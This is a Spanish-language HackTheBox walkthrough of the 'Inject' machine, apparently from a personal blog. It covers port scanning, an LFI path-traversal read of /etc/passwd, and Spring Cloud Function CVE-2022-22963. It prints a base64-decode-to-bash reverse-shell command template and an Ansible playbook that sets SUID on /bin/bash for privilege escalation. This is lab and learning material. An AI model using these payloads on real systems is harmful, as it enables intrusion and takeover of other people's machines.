---
layout: default
title: Inject
parent: HackTheBox
---
# Inject
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
{:.lead}

![](/assets/img/HTB_Injection/Inject.png)

## En esta maquina veremos:
* Scan de puertos
* LFI - Local File Inclusion
* Explotando funciones CRON

### Primer paso: PORT SCANNING

Vamos a usar la herramienta nmap, ya sabemos que hay muchas combinaciones, pero me gusta usar esta por la rapidez:

```bash
sudo nmap -sS -p- 65535 --open --min-rate 5000 -vvv -n -Pn <Ip de la Maquina> -oG <Nombre del archivo que contendra la informacion>
```
Aunque tambien podemos usar:
```bash
sudo nmap -T5 <IP Maquina>
```
A estos puertos le pasaremos un scan de **reconocimiento**, pero esta vez del servicio y versiones que corren tras la pagina.
```bash
nmap -sCV -p<Puertos>
```
Como sea, obtendemos lo siguiente:
![](/assets/img/HTB_Injection/Injection-PORTS.jpeg)

Podemos ver cosas interesantes:
* El puerto 22 (Perteneciente al SSH) esta abierto.
* No se emplea un puerto 80 o un 443 para mostrar la pagina, sino, un servicio web-proxy en el puerto **8080**

Si vamos a esa puerto, podremos ver una interfaz de subida de archivos.
![](/assets/img/HTB_Injection/Injection-UI.jpeg)

Si es que subimos un archivo **test**, por ejemplo, nos dejara buscar por un paramentro:

```http
http://<IP>:8080/show_image?img=
```
Entonces, vamos a interceptar la peticion con la herramienta **BURPSUITE**, para hacer test a ese parametro.

En este caso usaremos un LFI clasico, "../../../etc/passwd", esto para listar posibles ususarios dentro del sistema:

![](/assets/img/HTB_Injection/Injection-Burp1.jpeg)

Vemos que existe un usuario **frank** y otro usuario **phil**, pero realmente lo que ahora queremos hallar es la version del framework que usa esta aplicacion, asi que con **Burpsuite**, nos ponemos a listar los directorios, hasta toparnos con:

![](/assets/img/HTB_Injection/Injection-Burp2.jpeg)

Vemos cosas interesantes:
* Un Spring Framework
* La version usada es muy antigua (2.6.5)
Si buscamos nos toparemos con un CVE, el **CVE-2022-22963**

### CVE-2022-22963
Puedes usar la [herramienta que yo use](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit).

Pero si vamos a fondo, este **CVE-2022-22963**, explicado de forma rapida... Emplea un fallo de implementacion, atacando una ruta en especifico **"/functionRouter"**, dentro del servicio. 
* Le carga a la cabecera: 'spring.cloud.function.routing-expression', nuestro payload (En este caso una reverse shell), y la crea en el directorio temporal de la maquina.
Y bueno el comando que le carga en cuestion es el siguiente:
```bash
bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}
```
Donde **command** contiene nuestra reverse shell.

### Continuando:

Podemos ver que ha funcionado:
![](/assets/img/HTB_Injection/Injection-CVE.jpeg)![](/assets/img/HTB_Injection/Injection-Burp3.jpeg)

Por lo que ahora queda ponernos en escucha con la herramienta **netcat** o si queremos ahorrarnos tratar la tty, con **pwncat-cs**.
![](/assets/img/HTB_Injection/Injection-RS.jpeg)
Si vamos investigando dentro del directorio principal del usuario **frank**, vamos a toparnos con un directorio ".m2/" que contendra un archivo interesante: "settings.xml", este contendra la password del usuario **phil** (Que de igual forma podremos listar con **burpsuite**):
![](/assets/img/HTB_Injection/InjectionRS2.jpeg)

Como ya tenemos usuario y password de **phil**, simplemente ingresamos a su cuenta y solo nos quedaria usar una herramienta de reconocimiento para ver lo que sucede detras del sistema:

Podemos usar perfectamente:
```bash
ps -aux
```
O por otro lado, servirnos de la herramienta [**pspy64**](https://github.com/DominicBreuker/pspy)

![](/assets/img/HTB_Injection/Injection-PSPY.jpeg)

Y nos vamos a topar con algo interesante, hay un proceso que parece ejecutar una tarea cron, que apunta a un directorio que contiene formatos .yml

![](/assets/img/HTB_Injection/Injection-CRON.jpeg)

Asi que si vamos a es ruta, vamos a poder ver que tenemos permisos de escritura, por lo que le introducimos nuestra escalada de privilegios de la siguiente forma:

```yaml
- hosts: localhost
  tasks:
  - name: Privilege Escalation
    command: chmod u+s /bin/bash
  become: true
```
Como podemos ver, esto apunta contra el propio localhost de la maquina, y ejecuta el comando a nivel de sistema que le da permiso de ser ejecutado por el user+superuser al binario "/bin/bash".

![](/assets/img/HTB_Injection/InjectionYML.jpeg)

Acto seguido tenemos 2 opciones, esperar a la tarea **CRON**, o forzarla, si la queremos forzar, solo copiamos el comando, pero ejecutamos nuesto binario:
![](/assets/img/HTB_Injection/Injection-100.jpeg)
Como podemos ver, una vez que se ejecuta el permiso del binario cambia a **"-rwsr-sr-x"**, por lo que para escalar privilegios solo nos queda ejecutar un:
```bash
bash -p
```
## FIN
